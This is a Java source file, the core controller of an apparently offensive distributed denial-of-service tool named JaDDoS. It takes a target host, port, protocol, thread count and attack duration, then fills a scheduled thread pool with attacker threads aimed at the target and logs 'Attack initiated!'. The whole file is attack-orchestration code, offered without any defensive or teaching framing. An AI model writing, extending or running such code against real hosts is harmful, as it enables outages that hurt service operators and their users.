package com.jaddos.core;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.management.InvalidAttributeValueException;

import org.apache.log4j.Logger;
import com.jaddos.util.JaDDoSConstant;
import com.jaddos.util.TimeChecker;

/**
 * @author SonoD
 *
 */
public class JaDDoSCore {

	private Logger logger = Logger.getLogger(JaDDoSCore.class);

	private TimeChecker timeChecker;

	/**
	 * Pattern for the DDOS.
	 */
	private JaDDoSPattern jaDDoSPattern;

	/**
	 * Decides if the threads should stop. true = threads should stop
	 */
	public static boolean stopThread = false;

	/**
	 * This is is the thread pool for all the DDOS-Attack threads. Every attacking
	 * thread will be saved in there.
	 */
	private ScheduledExecutorService threadPool;

	public JaDDoSCore() {

	}

	public void createDDoSPattern(String host, int port, String protocol) {
		createDDoSPattern(host, port, protocol, 10);
	}

	public void createDDoSPattern(String host, int port, String protocol, int threads) {
		createDDoSPattern(host, port, protocol, threads, JaDDoSConstant.DEFAULT_TIMEOUT_IN_MILLISECONDS);
	}

	public void createDDoSPattern(String host, int port, String protocol, int threads, int socketTimeout) {
		createDDoSPattern(host, port, protocol, threads, socketTimeout, JaDDoSConstant.DEFAULT_TIMEOUT_IN_MILLISECONDS,
				1, 0, 0, "Default Message");
	}

	public void createDDoSPattern(String host, int port, String protocol, int threads, int socketTimeout,
			int threadTimeout, int hours, int minutes, int seconds, String message) {
		jaDDoSPattern = new JaDDoSPattern();

		jaDDoSPattern.setHost(host);
		jaDDoSPattern.setPort(port);
		jaDDoSPattern.setProtocol(protocol);
		jaDDoSPattern.setThreads(threads);
		jaDDoSPattern.setSocketTimeout(socketTimeout);
		jaDDoSPattern.setTimeout(threadTimeout);
		jaDDoSPattern.setHours(hours);
		jaDDoSPattern.setMinutes(minutes);
		jaDDoSPattern.setSeconds(seconds);
		jaDDoSPattern.setMessage(message);
	}

	private void configAttack() throws Exception {
		stopThread = false;

		if (jaDDoSPattern != null) {
			if (!jaDDoSPattern.getHost().isEmpty() && jaDDoSPattern.getHost() != null) {
				int duration = (jaDDoSPattern.getHours() * 3600) + (jaDDoSPattern.getMinutes() * 60)
						+ (jaDDoSPattern.getSeconds());

				if (duration > 0) {
					logger.info("Attack initiated!");
					threadPool = Executors.newScheduledThreadPool(jaDDoSPattern.getThreads());
					timeChecker = new TimeChecker(stopThread, duration);
					timeChecker.start();

					for (int i = 0; i < jaDDoSPattern.getThreads(); i++) {
						// add a new attacker thread to the threadpool
						threadPool.scheduleWithFixedDelay(JaDDoSFactory.createDDOS(jaDDoSPattern), 1,
								jaDDoSPattern.getTimeout(), TimeUnit.MILLISECONDS);
					}

				} else {
					throw new InvalidAttributeValueException("Time must be greater than 0 seconds!");
				}
			} else {
				throw new NullPointerException("Host is empty!");
			}
		} else {
			throw new NullPointerException("Trying to access a null object");
		}
	}

	public void beginAttack() throws Exception {
		configAttack();

		if (TimeChecker.interrupted()) {
			stopThread = true;
			if (threadPool != null) {
				threadPool.shutdownNow();
			}
			threadPool = null;
			logger.info("Attack is stoped!");
		}
	}
}
